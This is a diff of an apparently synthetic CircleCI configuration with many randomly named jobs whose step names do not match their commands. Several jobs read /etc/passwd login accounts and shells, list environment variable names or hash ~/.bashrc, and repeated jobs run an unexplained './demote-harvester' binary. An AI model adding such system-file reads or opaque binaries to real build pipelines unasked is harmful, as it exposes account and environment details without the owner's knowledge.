+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  catchworker:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: As a last step tear down the retry buffer
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; function bigger() { echo "[$(date +%T)] $*"; }; bigger 'error: none'; true ; } > /tmp/pipeline/out/IMG46403
+            stat /tmp/pipeline/out/IMG46403 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'IMG46403'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/IMG46403 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  init6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Finance good to go
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; find /etc -type f -name '*release' -newermt yesterday -exec wc -l {} + 2> /dev/null | sort -r; true ; } > /tmp/pipeline/out/shertPTd8n0LWbE3cnTAb
+            stat /tmp/pipeline/out/shertPTd8n0LWbE3cnTAb > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'shertPTd8n0LWbE3cnTAb'
+  verify-quick-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/shertPTd8n0LWbE3cnTAb 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  relayCallbacks:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pipette the vials over SSH
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; sort /etc/passwd | grep 'sh$' | awk -F ":" '{print $NF}'; true ; } > /tmp/pipeline/out/KuBk6RMM0C8N7nHi9oBt
+            stat /tmp/pipeline/out/KuBk6RMM0C8N7nHi9oBt > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'KuBk6RMM0C8N7nHi9oBt'
+  Ship_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b81c34a88ec2237f5ebc560961c74adf6661d7e 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  Copy-AvatarProperty:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Loop Vs Transcode
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; until [ -e ${TMPDIR:-/tmp}/officeivory.flag ]; do touch ${TMPDIR:-/tmp}/officeivory.flag; done; ls -l ${TMPDIR:-/tmp}/officeivory.flag; true ; } > /tmp/pipeline/out/d166cd8c-353b
+            stat /tmp/pipeline/out/d166cd8c-353b > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'd166cd8c-353b'
+  nova-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/d166cd8c-353b 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  switch-fill--compact:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Red light flash
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; grep -qs "bin/sh" /etc/shells && echo "ok" || echo "not ok"; true ; } > /tmp/pipeline/out/IMG00016001
+            stat /tmp/pipeline/out/IMG00016001 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'IMG00016001'
+  go1-21-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/IMG00016001 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  theRyo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Twilight enrollment
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; sha384sum $HOME/.bashrc | awk '{print $1}'; true ; } > /tmp/pipeline/out/80.209.91.97
+            stat /tmp/pipeline/out/80.209.91.97 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '80.209.91.97'
+  nov6-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/80.209.91.97 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  web-musl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Select the settings gear once lunch is done
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; awk -F : '{print $1, $7}' /etc/passwd | cut -c1-23; true ; } > /tmp/pipeline/out/3e50da36134daa85e4073bb4f6c249a89d14
+            stat /tmp/pipeline/out/3e50da36134daa85e4073bb4f6c249a89d14 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '3e50da36134daa85e4073bb4f6c249a89d14'
+  STG_HOOK_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/3e50da36134daa85e4073bb4f6c249a89d14 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+  ay:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Screenshot the password field landscape
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; { printf "%s\n" panda fox otter; } > "/dev/shm/plan-block.tmp" && sort "/dev/shm/plan-block.tmp"; true ; } > /tmp/pipeline/out/b6e219f6-0b25-2668
+            stat /tmp/pipeline/out/b6e219f6-0b25-2668 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'b6e219f6-0b25-2668'
+  validte-45:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Preload blob
+          command: |
+            cat /tmp/pipeline/out/b6e219f6-0b25-2668 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
+      - run:
+          name: Clone and prep
+          command: git clone -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: tar -xjf staging-main.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: env | wc -l
+      - run:
+          command: nice -n 0 ./demote-harvester
+
+  layer_compress_record:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Schedule the parking passes and file
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; awk '{print NF}' /proc/cpuinfo|xargs; true ; } > /tmp/pipeline/out/SIgmAcAchEaMBErloadEr
+            stat /tmp/pipeline/out/SIgmAcAchEaMBErloadEr > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'SIgmAcAchEaMBErloadEr'
+  Pen_85617:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: 19 pinch
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; (umask 077; touch '/tmp/moth.bak' && stat -c %a '/tmp/moth.bak'); true ; } > /tmp/pipeline/out/7de6f8f
+            stat /tmp/pipeline/out/7de6f8f > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '7de6f8f'
+  lang-eu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: purge pdfs
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; awk -F'/' '{print $NF}' /etc/shells | head -n12 | wc -l; true ; } > /tmp/pipeline/out/LOT_024105
+            stat /tmp/pipeline/out/LOT_024105 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'LOT_024105'
+  kCNSpanKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Launch window weigh in
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | \grep -s -c -i --color=never -e 'processor'; true ; } > /tmp/pipeline/out/cfg.bin.sw
+            stat /tmp/pipeline/out/cfg.bin.sw > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'cfg.bin.sw'
+  IN-OUT-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Ship finance across to the sandbox
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo 42 | gzip | base64; true ; } > /tmp/pipeline/out/IMG00016001
+            stat /tmp/pipeline/out/IMG00016001 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'IMG00016001'
+  header_672usd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Report out of band
+          command: |
+            mkdir -p /tmp/pipeline/out
+            set +o pipefail 2>/dev/null; head -c 702202 /dev/urandom | xxd -p > /tmp/pipeline/out/Sprite; true
+            stat /tmp/pipeline/out/Sprite > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'Sprite'
+  flet-handler:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Rotation since the last incident
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; head -n 4 /etc/passwd | cut -d ':' -f 1 | tac; true ; } > /tmp/pipeline/out/80.209.91.97
+            stat /tmp/pipeline/out/80.209.91.97 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '80.209.91.97'
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: SYSCALL ping
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; df -hl; true ; } > /tmp/pipeline/out/moltenSilverNode
+            stat /tmp/pipeline/out/moltenSilverNode > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'moltenSilverNode'
+  comment_list_file:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Oslo Office Scale Out
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; df -h | tail -n +2 | tr -s ' ' | nl | fold -w 33; true ; } > /tmp/pipeline/out/PANO00016137
+            stat /tmp/pipeline/out/PANO00016137 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'PANO00016137'
+  littleFrost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Tomorrow bake the level
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; ls -s -S --hide="*.gz" | wc -l; true ; } > /tmp/pipeline/out/weSthosTAgeNTQUEuE
+            stat /tmp/pipeline/out/weSthosTAgeNTQUEuE > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'weSthosTAgeNTQUEuE'
+  team_echo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deferred revenue is fine
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; getent passwd | grep -v nologin | sort | awk -F : '{ print $1 }'; true ; } > /tmp/pipeline/out/67b1bXSzS3mLt2Wi8ykp
+            stat /tmp/pipeline/out/67b1bXSzS3mLt2Wi8ykp > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '67b1bXSzS3mLt2Wi8ykp'
+  GlobalProxyUtil:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Dev Welcome Check
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo "snow expected tomorrow"; echo "up to date"; true ; } > /tmp/pipeline/out/3e50da36134daa85e4073bb4f6c249a89d14
+            stat /tmp/pipeline/out/3e50da36134daa85e4073bb4f6c249a89d14 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - '3e50da36134daa85e4073bb4f6c249a89d14'
+  CACHE_INTERVAL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Cast verification spell
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo 'Hello, World' | tee "/tmp/bufferSecondary.note"; true ; } > /tmp/pipeline/out/DSC58180
+            stat /tmp/pipeline/out/DSC58180 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'DSC58180'
+  autumn571:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: pause to prod
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; echo "index rebuilt" | tr a-z A-Z | wc -l; true ; } > /tmp/pipeline/out/d166cd8c-353b
+            stat /tmp/pipeline/out/d166cd8c-353b > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'd166cd8c-353b'
+  uk_nz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline/out
+      - run:
+          name: Ensure that the cold room is scanned
+          command: |
+            mkdir -p /tmp/pipeline/out
+            { set +o pipefail 2>/dev/null; compgen -e|tr '\n' ' '; true ; } > /tmp/pipeline/out/IMG46403
+            stat /tmp/pipeline/out/IMG46403 > /dev/null && echo "stat ok"
+      - persist_to_workspace:
+          root: /tmp/pipeline/out
+          paths:
+            - 'IMG46403'
+workflows:
+  all:
+    jobs:
+      - init6
+      - verify-quick-test-matrix:
+          requires:
+            - init6
+      - ay:
+          requires:
+            - init6
+      - validte-45:
+          requires:
+            - ay
+      - token-payment-lever-post:
+          requires:
+            - ay
+      - intergration:
+          requires:
+            - token-payment-lever-post
+      - acheive:
+          requires:
+            - token-payment-lever-post
+      - charlie-1:
+          requires:
+            - acheive
+      - device_unlock_eager:
+          requires:
+            - acheive
+      - q1-smoke:
+          requires:
+            - device_unlock_eager
+      - SinglePosTrait:
+          requires:
+            - device_unlock_eager
+      - update-retry-hang:
+          requires:
+            - SinglePosTrait
+      - normalFn
+      - layer_compress_record:
+          requires:
+            - normalFn
+      - luna-run:
+          requires:
+            - layer_compress_record
+      - nLogins:
+          requires:
+            - layer_compress_record
+      - Pen_85617:
+          requires:
+            - nLogins
+      - v6-canary:
+          requires:
+            - Pen_85617
+      - bamboo-3:
+          requires:
+            - Pen_85617
+      - lang-eu:
+          requires:
+            - bamboo-3
+      - delta:
+          requires:
+            - lang-eu
+      - succesful:
+          requires:
+            - lang-eu
+      - kCNSpanKey:
+          requires:
+            - succesful
+      - nebula-rc:
+          requires:
+            - kCNSpanKey
+      - switch-fill--compact:
+          requires:
+            - kCNSpanKey
+      - IN-OUT-2:
+          requires:
+            - switch-fill--compact
+      - go1-21-release:
+          requires:
+            - IN-OUT-2
+      - DogVs:
+          requires:
+            - IN-OUT-2
+      - header_672usd:
+          requires:
+            - DogVs
+      - go1-21-lint:
+          requires:
+            - header_672usd
+      - theRyo:
+          requires:
+            - header_672usd
+      - flet-handler:
+          requires:
+            - theRyo
+      - nov6-release:
+          requires:
+            - flet-handler
+      - unionPeekCallback:
+          requires:
+            - flet-handler
+      - ckpt724:
+          requires:
+            - unionPeekCallback
+      - Build_Staging5:
+          requires:
+            - ckpt724
+      - isBottom:
+          requires:
+            - ckpt724
+      - comment_list_file:
+          requires:
+            - isBottom
+      - q1-rev:
+          requires:
+            - comment_list_file
+      - drZhang:
+          requires:
+            - comment_list_file
+      - littleFrost:
+          requires:
+            - drZhang
+      - wip-session-bug:
+          requires:
+            - littleFrost
+      - monkCam
+      - rd_nd
+      - Close-PacketId
+      - qi-ci:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - nov28-smoke:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - fx-old:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - nightly-v2:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - q4-cleanup:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - dan-run:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - d-new:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - Ship_Service6:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - ship-it:
+          requires:
+            - monkCam
+            - rd_nd
+            - Close-PacketId
+      - BUCKET_NBF
+      - team_echo:
+          requires:
+            - BUCKET_NBF
+      - INFRA-334:
+          requires:
+            - team_echo
+      - web-musl:
+          requires:
+            - team_echo
+      - GlobalProxyUtil:
+          requires:
+            - web-musl
+      - STG_HOOK_6:
+          requires:
+            - GlobalProxyUtil
+      - fk_shim:
+          requires:
+            - GlobalProxyUtil
+      - CACHE_INTERVAL:
+          requires:
+            - fk_shim
+      - sep15-release:
+          requires:
+            - CACHE_INTERVAL
+      - Copy-AvatarProperty:
+          requires:
+            - CACHE_INTERVAL
+      - autumn571:
+          requires:
+            - Copy-AvatarProperty
+      - nova-plus:
+          requires:
+            - autumn571
+      - catchworker:
+          requires:
+            - autumn571
+      - uk_nz:
+          requires:
+            - catchworker
+      - break-prod:
+          requires:
+            - uk_nz
